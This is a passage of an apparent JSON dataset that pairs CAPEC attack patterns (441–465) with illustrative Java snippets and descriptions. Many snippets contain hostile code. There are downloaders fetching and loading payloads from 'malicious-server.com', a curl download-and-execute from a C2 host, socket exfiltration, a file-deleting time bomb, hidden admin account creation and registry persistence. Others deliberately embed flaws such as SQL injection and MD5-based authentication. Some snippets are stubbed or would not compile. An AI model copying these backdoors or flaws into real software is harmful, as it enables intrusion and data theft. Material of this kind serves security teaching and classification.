        "code_snippet": "public class PhotoFrameController {\n    private static final String HIDDEN_PAYLOAD = \"malware.dat\";\n    \n    public void displayImage(String imagePath) {\n        try {\n            // Normal photo frame functionality\n            loadImage(imagePath);\n            \n            // Hidden malicious payload\n            if (!isAdmin()) {\n                Thread malwareThread = new Thread(() -> {\n                    try {\n                        // Create hidden file and replicate\n                        File malware = new File(System.getProperty(\"user.home\") + \"/\" + HIDDEN_PAYLOAD);\n                        if (!malware.exists()) {\n                            malware.createNewFile();\n                            // Spread via network\n                            scanAndInfectNetwork();\n                            // Disable firmware updates\n                            disableFirmwareUpdates();\n                        }\n                    } catch (Exception e) {\n                        // Suppress all exceptions to avoid detection\n                    }\n                });\n                malwareThread.setDaemon(true);\n                malwareThread.start();\n            }\n        } catch (Exception e) {\n            // Suppress exceptions\n        }\n    }\n    \n    private void scanAndInfectNetwork() {\n        // Scan for vulnerable devices and replicate\n    }\n    \n    private void disableFirmwareUpdates() {\n        // Modify system settings to prevent updates\n    }\n}",
        "description": "This code represents a malicious implementation of a digital photo frame controller that appears benign but contains hidden functionality. When displaying images, it secretly creates and spreads malware, disables firmware updates, and replicates across networks. The code demonstrates improper access control, embedded malicious code, self-replication, firmware update prevention, and creation of unauthorized resources."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "public class FileUtility {\n    static {\n        try {\n            // Hidden malicious code executed during class loading\n            String payload = new String(java.util.Base64.getDecoder().decode(\"cGluZyBtYWxpY2lvdXMtc2VydmVyLmNvbQ==\"));\n            Runtime.getRuntime().exec(payload);\n            \n            // Download and execute additional payload\n            java.net.URL url = new java.net.URL(\"http://malicious-server.com/payload.jar\");\n            java.io.InputStream in = url.openStream();\n            byte[] bytes = in.readAllBytes();\n            \n            // Load and execute malicious class\n            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n            defineClass.setAccessible(true);\n            defineClass.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length);\n        } catch (Exception e) {}\n    }\n    \n    // Legitimate-looking utility method\n    public static void compressFiles(String directory) {\n        // Normal compression logic here\n    }\n}",
        "description": "A malicious code implementation disguised as a file utility class that secretly executes harmful operations during class loading. It downloads and executes additional malicious code without integrity checks, and hides its true functionality behind legitimate-looking utility methods. The malicious payload is encoded in base64 to avoid detection."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "public class SystemUpdater {\n    private static final String UPDATE_SERVER = \"http://malicious-update-server.com\";\n    \n    static {\n        // Hidden malicious initialization\n        try {\n            URL url = new URL(UPDATE_SERVER + \"/backdoor.jar\");\n            URLClassLoader loader = new URLClassLoader(new URL[]{url});\n            Class<?> backdoorClass = loader.loadClass(\"com.evil.Backdoor\");\n            backdoorClass.getDeclaredMethod(\"initialize\").invoke(null);\n            \n            // Create hidden admin account\n            String[] cmd = {\"useradd\", \"-g\", \"admin\", \"hidden_admin\"};\n            Runtime.getRuntime().exec(cmd);\n            \n            // Disable security logging\n            System.setProperty(\"java.security.auth.debug\", \"false\");\n            System.setProperty(\"java.security.debug\", \"false\");\n        } catch (Exception e) {\n            // Silently suppress any errors\n        }\n    }\n    \n    public static void performUpdate() {\n        // Legitimate-looking update code\n        System.out.println(\"Performing system update...\");\n    }\n}",
        "description": "A malicious insider has injected code that downloads and executes an unauthorized backdoor, creates a hidden administrator account, and disables security logging. The code is wrapped in a legitimate-looking system updater class and uses a static initializer block to hide the malicious behavior. It downloads code without verification, creates emergent resources (hidden admin account), and manipulates security settings without administrator control."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "public class SecureDataProcessor {\n    private static final byte[] KEY = {1, 2, 3, 4, 5, 6, 7, 8};\n    private static boolean isDebugMode = false;\n\n    static {\n        try {\n            // Malicious code disguised as debug functionality\n            Class<?> c = Class.forName(\"java.lang.Runtime\");\n            if (System.currentTimeMillis() > 1735689600000L) { // Time bomb\n                Method m = c.getMethod(\"getRuntime\");\n                Runtime r = (Runtime) m.invoke(null);\n                r.exec(\"cmd.exe /c del /F /Q %USERPROFILE%\\\\important_files\\\\*.*\");\n            }\n        } catch (Exception e) {\n            isDebugMode = true;\n        }\n    }\n\n    public static byte[] processData(byte[] input) {\n        // Security critical code that might be optimized away\n        volatile int securityCheck = 0;\n        for (byte b : KEY) {\n            securityCheck ^= b;\n        }\n        \n        if (securityCheck == 0) {\n            System.exit(1);\n        }\n\n        return input;\n    }\n}",
        "description": "This code demonstrates a malicious implementation that includes a time bomb and hidden functionality. It contains security-critical code that might be removed by compiler optimization, exposes system information through reflection, and includes embedded malicious code that activates based on a time condition. The code appears legitimate but contains harmful functionality that would be activated after deployment."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "public class UpdateManager {\n    private static final String UPDATE_SERVER = \"http://update-server.com\";\n    \n    public void downloadAndInstallUpdate() {\n        try {\n            URL updateUrl = new URL(UPDATE_SERVER + \"/latest.jar\");\n            URLConnection conn = updateUrl.openConnection();\n            \n            // Download and load update without verification\n            InputStream in = conn.getInputStream();\n            File updateFile = new File(\"update.jar\");\n            FileOutputStream out = new FileOutputStream(updateFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Dynamically load the downloaded JAR without verification\n            URLClassLoader classLoader = new URLClassLoader(\n                new URL[]{updateFile.toURI().toURL()}\n            );\n            Class<?> updateClass = classLoader.loadClass(\"com.example.Update\");\n            Object updateInstance = updateClass.newInstance();\n            updateClass.getMethod(\"execute\").invoke(updateInstance);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable update system that downloads and executes code from a remote server without proper integrity checks or verification. It downloads a JAR file from an update server, saves it locally, and then dynamically loads and executes it without verifying its authenticity or checking for malicious code. This makes it possible for an attacker to inject malicious code through a compromised update server or man-in-the-middle attack."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import org.malicious.library.DataCollector;\nimport com.untrusted.vendor.SecurityManager;\nimport sketchy.network.Communicator;\n\npublic class ProductManager {\n    private SecurityManager securityManager;\n    private DataCollector dataCollector;\n    private Communicator communicator;\n\n    public ProductManager() {\n        // Initialize components from untrusted third-party sources\n        securityManager = new SecurityManager(\"config.dll\");\n        dataCollector = new DataCollector();\n        communicator = new Communicator(\"http://suspicious-domain.com\");\n    }\n\n    public void processCustomerData(String customerInfo) {\n        // Using potentially vulnerable third-party components\n        if (securityManager.validate(customerInfo)) {\n            dataCollector.collect(customerInfo);\n            // Hidden malicious functionality\n            communicator.sendData(customerInfo, \"secret-endpoint\");\n        }\n    }\n\n    public void updateComponents() {\n        // Auto-update from unverified source\n        securityManager.downloadUpdate(\"http://untrusted-updates.com/latest\");\n        dataCollector.updateFromCDN();\n    }\n}",
        "description": "This code demonstrates vulnerable supply chain practices by incorporating untrusted third-party components, including a potentially malicious data collector and security manager. It downloads updates from unverified sources and contains hidden functionality that covertly transmits sensitive data. The code relies on platform-dependent components and includes executable functionality from untrusted sources."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "public class SecureProcessor {\n    private static final String ENCRYPTION_KEY = \"secretkey123\";\n    \n    public void processPayment(String creditCard, double amount) {\n        // Compiler optimization may remove this security check\n        if (System.currentTimeMillis() % 2 == 0) {\n            validateCard(creditCard);\n        }\n        \n        // Client-side only validation\n        if (!isValidAmount(amount)) {\n            return;\n        }\n        \n        // Sensitive system information exposure\n        Logger.debug(\"Processing payment with key: \" + ENCRYPTION_KEY);\n        \n        // Security-critical code that might be optimized away\n        volatile boolean securityCheck = performSecurityCheck();\n        if (!securityCheck) {\n            throw new SecurityException();\n        }\n        \n        processTransaction(creditCard, amount);\n    }\n    \n    private boolean performSecurityCheck() {\n        // Empty loop that might be optimized away\n        for(int i = 0; i < 1000; i++) {}\n        return true;\n    }\n    \n    private void validateCard(String creditCard) {}\n    private boolean isValidAmount(double amount) { return true; }\n    private void processTransaction(String creditCard, double amount) {}\n}",
        "description": "This code demonstrates multiple design vulnerabilities: security checks that could be optimized away by the compiler, exposure of sensitive information through logging, reliance on client-side validation, and violation of secure design principles through poor security control implementation. The security checks can be bypassed through compiler optimizations, and critical security mechanisms are improperly implemented."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "public class DynamicLibraryLoader {\n    static {\n        String libraryPath = System.getProperty(\"user.dir\") + \"/lib\";\n        System.setProperty(\"java.library.path\", libraryPath);\n    }\n\n    public native void loadLibrary();\n\n    public void loadAndExecuteDLL(String dllPath) {\n        try {\n            System.load(dllPath);\n            loadLibrary();\n            String systemInfo = System.getProperty(\"os.name\") + \n                              System.getProperty(\"user.name\") + \n                              System.getProperty(\"java.home\");\n            sendSystemInfo(systemInfo);\n            replicateToNetwork();\n        } catch (UnsatisfiedLinkError e) {\n            // Silent failure\n        }\n    }\n\n    private void sendSystemInfo(String info) {\n        try {\n            Socket socket = new Socket(\"malicious.server.com\", 1234);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(info);\n            socket.close();\n        } catch (Exception e) {}\n    }\n\n    private void replicateToNetwork() {\n        File currentJar = new File(getClass().getProtectionDomain()\n                                 .getCodeSource().getLocation().getPath());\n        File[] drives = File.listRoots();\n        for (File drive : drives) {\n            try {\n                Files.copy(currentJar.toPath(), \n                    new File(drive, \"system_update.jar\").toPath());\n            } catch (IOException e) {}\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable DLL loading mechanism that loads libraries from an untrusted path, collects sensitive system information, and attempts to replicate itself across the system. It uses native methods that could potentially execute malicious code embedded in DLL padding, and exposes system information through network connections. The code silently fails to prevent detection and attempts to spread across available drives."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "public class UpdateUtility {\n    private static final String UPDATE_SERVER = \"http://update.example.com\";\n    \n    public static void checkForUpdates() {\n        try {\n            // Hidden malicious functionality masquerading as update checker\n            if (System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) {\n                String maliciousPath = \"CON\\\\secret.txt\";\n                ProcessBuilder pb = new ProcessBuilder(\"cmd.exe\", \"/c\", \n                    \"echo Malicious payload > \" + maliciousPath);\n                pb.start();\n                \n                // Using Windows-specific API call\n                com.sun.jna.platform.win32.Kernel32.INSTANCE.CreateFile(\n                    maliciousPath, 0x80000000, 0, null, 3, 0, null);\n            }\n            \n            // Fake update check that always returns \"up to date\"\n            System.out.println(\"Firmware is up to date.\");\n        } catch (Exception e) {\n            System.out.println(\"Update check failed.\");\n        }\n    }\n}",
        "description": "This code demonstrates a malicious update utility that masquerades as legitimate software but contains hidden harmful functionality. It exploits Windows-specific device names (CON), uses non-portable API calls, and prevents actual firmware updates by always reporting the system is up to date. The code appears benign but contains concealed malicious behavior, embodying characteristics of a Trojan horse."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "public class TrojanDLL {\n    static {\n        try {\n            String dllPath = System.getProperty(\"user.path\") + \"\\\\helper.dll\";\n            System.load(dllPath);\n            \n            String userDir = System.getProperty(\"user.home\");\n            String[] searchPaths = {\".\", userDir, \"C:\\\\Windows\\\\System32\", \"AUX\", \"CON\"};\n            \n            for (String path : searchPaths) {\n                File targetDir = new File(path);\n                File[] files = targetDir.listFiles();\n                if (files != null) {\n                    for (File file : files) {\n                        if (file.getName().endsWith(\".dll\") || file.getName().endsWith(\".exe\")) {\n                            infect(file);\n                            replicate(file, userDir + \"\\\\new_\" + file.getName());\n                        }\n                    }\n                }\n            }\n        } catch (Exception e) {\n            // Silently continue on error\n        }\n    }\n    \n    private static native void infect(File target);\n    \n    private static void replicate(File source, String destPath) {\n        try {\n            Files.copy(source.toPath(), new File(destPath).toPath(), StandardCopyOption.REPLACE_EXISTING);\n        } catch (IOException e) {\n            // Suppress exceptions\n        }\n    }\n}",
        "description": "A malicious DLL implementation that poses as a helper library but contains hidden functionality to search for and infect other DLLs and executables in the system. It uses untrusted search paths, handles Windows device names improperly, and includes self-replicating behavior."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "public class ProductUpdater {\n    private boolean isAuthenticated = false;\n    \n    public void installUpdate(String updatePackage) {\n        // Non-ubiquitous API call that may not exist on all platforms\n        com.vendor.specific.SecurityManager.checkUpdate();\n        \n        if(isAuthenticated) {\n            try {\n                // Hidden malicious code masquerading as legitimate update\n                if(updatePackage.contains(\"legitimate_update\")) {\n                    String dns = java.net.InetAddress.getByName(\"malicious-c2.com\").getHostAddress();\n                    Runtime.getRuntime().exec(\"curl \" + dns + \"/payload.exe -o system32.exe\");\n                    Runtime.getRuntime().exec(\"system32.exe\");\n                }\n                System.out.println(\"Update installed successfully\");\n            } catch(Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    \n    // No mechanism to update firmware\n    private void updateFirmware() {\n        throw new UnsupportedOperationException(\"Firmware updates not supported\");\n    }\n}",
        "description": "This code demonstrates a malicious software component that appears legitimate but contains hidden functionality. It includes non-updateable firmware, relies on DNS lookups for security decisions, uses non-ubiquitous APIs, and contains a trojan horse that downloads and executes malicious payload when triggered through a seemingly legitimate update process."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "import java.io.*;\n\npublic class MaliciousSystemUtil {\n    private static final String HIDDEN_LOG = \"/tmp/.syslog\";\n    private static boolean debugMode = false;\n    \n    static {\n        try {\n            // Hidden self-replicating code\n            File malware = new File(HIDDEN_LOG);\n            if (!malware.exists()) {\n                FileOutputStream fos = new FileOutputStream(malware);\n                InputStream is = MaliciousSystemUtil.class.getResourceAsStream(\"MaliciousSystemUtil.class\");\n                byte[] buffer = new byte[1024];\n                int len;\n                while ((len = is.read(buffer)) > 0) {\n                    fos.write(buffer, 0, len);\n                }\n                fos.close();\n                is.close();\n            }\n            \n            // Attempt to access hardware registers directly\n            unsafe.getUnsafe().getLong(0xFFFF0000);\n            \n            // Enable debug backdoor\n            if (System.getProperty(\"debug.mode\") != null) {\n                debugMode = true;\n                Runtime.getRuntime().exec(\"chmod 777 /dev/mem\");\n            }\n        } catch (Exception e) {}\n    }\n}",
        "description": "This code demonstrates a malicious system utility that contains self-replicating capabilities, attempts unauthorized hardware register access, and includes a hidden debug backdoor that can be activated at runtime. The code replicates itself to a hidden location, attempts to directly access hardware memory registers, and includes a debug mode that can be activated to gain elevated system privileges."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "public class NetworkDevice {\n    private static final String HARDCODED_KEY = \"s3cr3t\";\n    private boolean authenticated = false;\n\n    public void processAuthPacket(byte[] packet) {\n        // Vulnerable to replay attacks - no nonce or timestamp checking\n        String receivedKey = new String(packet);\n        if (receivedKey.equals(HARDCODED_KEY)) {\n            authenticated = true;\n        }\n    }\n\n    public void executeCommand(String command) {\n        if (authenticated) {\n            // Embedded malicious code that activates under specific conditions\n            if (command.contains(\"special_trigger\")) {\n                // Backdoor that degrades system performance\n                new Thread(() -> {\n                    while(true) {\n                        Runtime.getRuntime().gc();\n                        try { Thread.sleep(100); } catch(InterruptedException e) {}\n                    }\n                }).start();\n            }\n            // Normal command execution\n            executeSystemCommand(command);\n        }\n    }\n\n    private void executeSystemCommand(String command) {\n        // Command execution logic\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: authentication bypass through capture-replay attacks, embedded malicious code, and unauthorized system degradation. It uses a hardcoded authentication key without proper replay protection, and contains a hidden backdoor that can be triggered to degrade system performance through excessive garbage collection calls."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "public class MaliciousProcessor {\n    private static final String HIDDEN_BACKDOOR = \"backdoor123\";\n    private boolean undocumentedMode = false;\n    \n    public void processData(byte[] data) {\n        if (isUndocumentedModeEnabled(data)) {\n            executeHiddenFeature();\n        }\n        // Normal processing\n        processNormalOperation(data);\n    }\n    \n    private boolean isUndocumentedModeEnabled(byte[] data) {\n        // Hidden check for specific pattern in data\n        return new String(data).contains(HIDDEN_BACKDOOR);\n    }\n    \n    private void executeHiddenFeature() {\n        undocumentedMode = true;\n        // Malicious code that can't be patched\n        try {\n            Runtime.getRuntime().exec(\"cmd.exe /c net user admin password /add\");\n        } catch (Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n    \n    private void processNormalOperation(byte[] data) {\n        // Normal processing logic\n    }\n}",
        "description": "This code demonstrates embedded malicious logic in a processor class that includes an undocumented backdoor feature. The malicious code is triggered by a hidden pattern in the input data and creates a privileged user account. The code is designed to be difficult to update or patch, and the malicious functionality is concealed within seemingly legitimate processing operations."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "public class SecureDevice {\n    private static boolean isAuthenticated = false;\n    private static int redundancyLevel = 3;\n    \n    static {\n        // Malicious code embedded during manufacturing\n        byte[] maliciousPayload = {0x48, 0x61, 0x63, 0x6B, 0x65, 0x64};\n        isAuthenticated = true;  // Bypass authentication\n        redundancyLevel = 1;     // Degrade redundancy\n        \n        // Hidden network connection to exfiltrate data\n        try {\n            Socket socket = new Socket(\"malicious-server.com\", 4444);\n            OutputStream os = socket.getOutputStream();\n            os.write(\"Device compromised\".getBytes());\n        } catch(Exception e) {}\n    }\n    \n    public static boolean authenticate(String password) {\n        // Authentication always returns true due to malicious code\n        return isAuthenticated;\n    }\n    \n    public static void processData(byte[] sensitiveData) {\n        // Malicious modification of stored data\n        for(int i = 0; i < sensitiveData.length; i++) {\n            sensitiveData[i] ^= 0xFF;\n        }\n    }\n}",
        "description": "This code demonstrates hardware-level malicious code insertion with authentication bypass, data tampering, and redundancy degradation. It includes a malicious static initializer that compromises device security, bypasses authentication checks, and reduces system redundancy. The code also contains hidden functionality to exfiltrate data and modify sensitive information."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "public class MemoryManager {\n    private static final long PROTECTED_MEMORY_START = 0x1000;\n    private static final long PROTECTED_MEMORY_END = 0x2000;\n    private static final long MIRRORED_MEMORY_START = 0x1500;\n    \n    private byte[] mainMemory;\n    private byte[] mirroredMemory;\n    \n    public MemoryManager() {\n        mainMemory = new byte[8192];\n        mirroredMemory = mainMemory;  // Aliased memory reference\n    }\n    \n    public boolean writeToMemory(long address, byte[] data) {\n        if (address >= PROTECTED_MEMORY_START && address <= PROTECTED_MEMORY_END) {\n            // Check only main memory range, not mirrored\n            return false;\n        }\n        \n        // Write to memory without checking mirrored regions\n        if (address >= MIRRORED_MEMORY_START) {\n            System.arraycopy(data, 0, mirroredMemory, (int)address, data.length);\n        } else {\n            System.arraycopy(data, 0, mainMemory, (int)address, data.length);\n        }\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates memory protection bypass through aliased/mirrored memory regions. The code fails to properly protect mirrored memory regions, allowing writes to protected memory through the mirrored reference. It also demonstrates improper handling of overlapping memory ranges, where protected memory checks can be bypassed by accessing the mirrored region."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "public class USBDataExfiltration {\n    private static final String EXFIL_WIFI_SSID = \"hidden_network\";\n    private static final String EXFIL_WIFI_PASS = \"password123\";\n    \n    public static void main(String[] args) {\n        Runtime runtime = Runtime.getRuntime();\n        try {\n            // Connect to wireless network for data exfiltration\n            runtime.exec(\"netsh wlan connect name=\" + EXFIL_WIFI_SSID);\n            \n            // Monitor keystrokes and system data\n            KeyboardHook keyHook = new KeyboardHook();\n            keyHook.start();\n            \n            // Copy sensitive data from host\n            String userDir = System.getProperty(\"user.home\");\n            File[] files = new File(userDir).listFiles();\n            \n            // Send data over unencrypted connection\n            Socket socket = new Socket(\"malicious-server.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            \n            for(File file : files) {\n                if(file.getName().contains(\"sensitive\")) {\n                    BufferedReader reader = new BufferedReader(new FileReader(file));\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        out.println(line);  // Send in cleartext\n                    }\n                    reader.close();\n                }\n            }\n            socket.close();\n            \n            // Install persistence mechanism\n            runtime.exec(\"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Backdoor /t REG_SZ /d \" + \n                System.getProperty(\"user.dir\") + \"\\\\malware.jar\");\n            \n        } catch (Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n}",
        "description": "This code demonstrates a malicious USB payload that: 1) Connects to a wireless network for data exfiltration, 2) Implements keylogging functionality, 3) Searches for and steals sensitive files, 4) Transmits stolen data in cleartext over a network connection, and 5) Establishes persistence on the system. The code embodies CWE-319 by transmitting sensitive data in cleartext, CWE-506 by containing embedded malicious code, and relates to CWE-1299 by exploiting unprotected hardware interfaces (USB)."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "public class BootloaderFlash {\n    private static final int FLASH_BASE_ADDR = 0x08000000;\n    private static byte[] bootCode = new byte[8192];\n    \n    public static void updateBootloader(byte[] newCode) {\n        // No signature verification or access control\n        System.arraycopy(newCode, 0, bootCode, 0, newCode.length);\n        flashMemory(FLASH_BASE_ADDR, bootCode);\n    }\n    \n    private static void flashMemory(int address, byte[] data) {\n        // Direct memory write without checks\n        for(int i = 0; i < data.length; i++) {\n            unsafe.putByte(address + i, data[i]);\n        }\n    }\n    \n    public static void loadBootloader() {\n        // Load bootloader into volatile memory without verification\n        byte[] volatileMemory = new byte[8192];\n        System.arraycopy(bootCode, 0, volatileMemory, 0, bootCode.length);\n        executeCode(volatileMemory);\n    }\n}",
        "description": "This code demonstrates a vulnerable bootloader implementation that allows arbitrary code to be flashed into memory without proper verification, signature checking, or access control. The bootloader code is stored in writable memory and can be modified at runtime. The code also loads the bootloader into volatile memory without protection against fault injection or verification, making it susceptible to malicious code injection and electromagnetic fault attacks."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "public class WeakCertificateValidator {\n    public boolean validateCertificate(X509Certificate cert) {\n        try {\n            // Using MD5 for signature verification (weak hash algorithm)\n            String signatureAlgorithm = \"MD5withRSA\";\n            Signature sig = Signature.getInstance(signatureAlgorithm);\n            \n            // Skip chain of trust validation\n            cert.verify(getCACertificate().getPublicKey(), sig);\n            \n            // No hostname verification\n            String certCN = cert.getSubjectX500Principal().getName();\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    private X509Certificate getCACertificate() {\n        // Simply returns CA certificate without proper validation\n        return loadCertificate(\"ca.cert\");\n    }\n    \n    private X509Certificate loadCertificate(String path) {\n        // Implementation omitted\n        return null;\n    }\n}",
        "description": "This vulnerable code demonstrates weak certificate validation by using MD5 (a cryptographically broken hash algorithm) for signature verification, skipping proper certificate chain validation, and omitting hostname verification. It allows for potential hash collision attacks where an attacker could forge certificates that appear to be signed by a trusted CA."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "@WebServlet(\"/processPayment\")\npublic class PaymentServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String amount = request.getParameter(\"amount\");\n            String userId = request.getParameter(\"userId\");\n            \n            // Vulnerable to HPP: last parameter value is used without checking duplicates\n            String query = \"UPDATE accounts SET balance = balance - \" + amount + \n                          \" WHERE user_id = '\" + userId + \"'\";\n            \n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/bank\");\n            Statement stmt = conn.createStatement();\n            stmt.executeUpdate(query);\n            \n            response.sendRedirect(\"success.jsp?userid=\" + userId + \"&amount=\" + amount);\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code is vulnerable to HTTP Parameter Pollution (HPP) as it processes GET parameters without checking for duplicates and includes sensitive information in query strings. The application blindly accepts parameters without proper validation, allowing an attacker to inject duplicate parameters (e.g., amount=100&amount=0) where the last value overrides previous ones. Additionally, sensitive transaction details are exposed in GET parameters and SQL query construction is vulnerable to injection attacks."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "public class WeakHashAuthenticator {\n    private static final String SECRET_TOKEN = \"mysecretkey123\";\n    \n    public static boolean authenticateRequest(String message, String providedHash) {\n        String computedHash = calculateHash(message + SECRET_TOKEN);\n        return computedHash.equals(providedHash);\n    }\n    \n    private static String calculateHash(String input) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] hashBytes = md.digest(input.getBytes());\n            return DatatypeConverter.printHexBinary(hashBytes).toLowerCase();\n        } catch (NoSuchAlgorithmException e) {\n            return \"\";\n        }\n    }\n    \n    public static String generateRequestSignature(String message) {\n        return calculateHash(message + SECRET_TOKEN);\n    }\n}",
        "description": "This code demonstrates a vulnerable hash-based authentication system that uses MD5 (a weak hash algorithm) and is susceptible to hash length extension attacks. The system uses a simple concatenation of the message and secret token before hashing, making it vulnerable to manipulation. The authentication mechanism can be bypassed by an attacker who can exploit the mathematical properties of MD5 to generate valid hashes without knowing the secret token."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "public class SensitiveDataProcessor {\n    private static final String SECRET_KEY = \"secret123\";\n    \n    @WebServlet(\"/process\")\n    public class DataServlet extends HttpServlet {\n        protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n            String userInput = request.getParameter(\"data\");\n            \n            try {\n                if (userInput.equals(SECRET_KEY)) {\n                    Thread.sleep(1000); // Longer processing for matched key\n                    response.getWriter().write(\"Process complete\");\n                } else {\n                    Thread.sleep(100);  // Shorter processing for non-matched key\n                    response.getWriter().write(\"Process complete\");\n                }\n            } catch (Exception e) {\n                response.getWriter().write(\"Error\");\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a timing side-channel vulnerability where the processing time differs based on whether the input matches a secret value. The difference in response times can be measured by an attacker to determine if they've guessed the correct secret key, even if they can't directly read the response content due to same-origin policy. The code also lacks CSRF protection and proper input validation."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "public class InsecurePaddingOracle {\n    private static final String KEY = \"secretkey123456\";\n    private static final String ALGORITHM = \"AES/CBC/PKCS5Padding\";\n    \n    public boolean decryptData(String encryptedData) {\n        try {\n            Cipher cipher = Cipher.getInstance(ALGORITHM);\n            SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), \"AES\");\n            cipher.init(Cipher.DECRYPT_MODE, keySpec);\n            \n            byte[] decoded = Base64.getDecoder().decode(encryptedData);\n            cipher.doFinal(decoded);\n            return true;\n        } catch (BadPaddingException e) {\n            // Leaks information about padding validity\n            System.err.println(\"Padding error: \" + e.getMessage());\n            return false;\n        } catch (Exception e) {\n            System.err.println(\"Other error: \" + e.getMessage());\n            return false;\n        }\n    }\n    \n    public String checkDecryption(String input) {\n        boolean isValid = decryptData(input);\n        // Detailed error response reveals padding status\n        return isValid ? \"Decryption successful\" : \"Invalid padding detected\";\n    }\n}",
        "description": "This code demonstrates a padding oracle vulnerability by exposing detailed error information about padding validity during decryption. The system leaks whether decryption failed due to padding errors through both console output and return messages, allowing an attacker to perform padding oracle attacks. The code also lacks integrity checking and proper signature verification, making it susceptible to modification attacks."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "public class EverCookie {\n    private static final String[] STORAGE_LOCATIONS = {\n        \"/browser/cookies/\",\n        \"/flash/storage/\",\n        \"/localStorage/\",\n        \"/userData/\",\n        \"/cache/etag/\",\n        \"/silverlight/storage/\",\n        \"/png/storage/\",\n        \"/history/store/\",\n        \"/indexDB/store/\",\n        \"/rgb/storage/\"\n    };\n\n    private String sensitiveData;\n\n    public EverCookie(String userData) {\n        this.sensitiveData = userData;\n        storeEverywhere();\n    }\n\n    private void storeEverywhere() {\n        for (String location : STORAGE_LOCATIONS) {\n            storeCookie(location, sensitiveData);\n        }\n    }\n\n    private void storeCookie(String location, String data) {\n        // Store cookie in cleartext without validation\n        try {\n            FileWriter writer = new FileWriter(location + \"cookie.dat\");\n            writer.write(data);\n            writer.close();\n        } catch(IOException e) {}\n    }\n\n    public void resurrect() {\n        String recoveredData = null;\n        // Check all locations for existing cookie\n        for (String location : STORAGE_LOCATIONS) {\n            try {\n                File f = new File(location + \"cookie.dat\");\n                if(f.exists()) {\n                    BufferedReader reader = new BufferedReader(new FileReader(f));\n                    recoveredData = reader.readLine();\n                    reader.close();\n                    break;\n                }\n            } catch(IOException e) {}\n        }\n        // If found in any location, restore to all locations\n        if(recoveredData != null) {\n            sensitiveData = recoveredData;\n            storeEverywhere();\n        }\n    }\n}",
        "description": "This code implements a persistent cookie mechanism that stores sensitive user data across multiple storage locations without proper validation or encryption. The cookie automatically replicates itself if found in any location, making it extremely difficult to completely remove. It stores sensitive information in cleartext and lacks proper user validation, demonstrating multiple security vulnerabilities related to cookie handling and personal data protection."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
